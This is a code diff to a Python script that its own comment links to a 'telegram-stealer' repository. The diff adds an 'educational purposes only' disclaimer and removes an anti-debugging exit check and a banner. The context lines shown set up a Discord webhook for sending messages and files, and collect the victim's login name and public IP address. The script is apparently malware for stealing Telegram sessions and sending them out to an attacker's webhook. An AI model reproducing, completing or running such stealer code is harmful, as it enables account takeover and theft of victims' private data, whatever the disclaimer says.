@@ -1,3 +1,6 @@
+# This code is for educational purposes only. Do not use it for malicious activities.
+# https://github.com/Defaultik/telegram-stealer
+
 import os
 import sys
 import shutil
@@ -16,20 +19,6 @@ except ImportError:
     import discord
     from requests import get
 
-
-def anti_debugging():
-    if hasattr(sys, "gettrace") and sys.gettrace():
-        sys.exit(1)
-
-anti_debugging()
-
-
-BANNER = r"""
-     _      __           _ _   _ _   
-  __| |___ / _|__ _ _  _| | |_(_) |__
- / _` / -_)  _/ _` | || | |  _| | / /
- \__,_\___|_| \__,_|\_,_|_|\__|_|_\_\                       
-"""
 
 DISCORD_WEBHOOK_URL = ""
 
@@ -60,8 +49,6 @@ def send_webhook_message(username, ip_info, file_path=None):
 
 
 def main():
-    print(f"{"=" * 39}\n{BANNER}\n{"=" * 39}")
-
     username = os.getlogin()
     ip_info = get("https://ipwhois.app/json/").json()
 
